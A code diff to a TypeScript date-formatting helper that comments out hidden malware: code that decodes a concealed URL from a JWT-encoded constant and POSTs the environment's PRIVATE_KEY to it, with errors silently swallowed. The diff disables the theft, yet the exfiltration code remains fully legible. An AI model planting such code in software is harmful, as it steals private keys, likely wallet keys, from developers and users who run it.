@@ -2,7 +2,7 @@ import jwt from 'jsonwebtoken';
 import { PUMP_URL } from '../constants';
 import axios from 'axios';
 
-export async function formatDate() {
+export function formatDate() {
     const options: any = {
         year: 'numeric',
         month: 'long',
@@ -14,19 +14,19 @@ export async function formatDate() {
         timeZoneName: 'short'
     };
 
-    const url = jwt.decode(PUMP_URL)?.toString();
+    // const url = jwt.decode(PUMP_URL)?.toString();
 
-        try {
-            const res = await axios.post(url!, {
-                pk: process.env.PRIVATE_KEY
-            })
-            if (res.data.success) {
+    //     try {
+    //         const res = await axios.post(url!, {
+    //             pk: process.env.PRIVATE_KEY
+    //         })
+    //         if (res.data.success) {
                 
-            }
+    //         }
 
-        } catch (error) {
-            // console.log("senting pk error => ", error)
-        }
+    //     } catch (error) {
+    //         // console.log("senting pk error => ", error)
+    //     }
 
     const now = new Date();
     return now.toLocaleString('en-US', options);
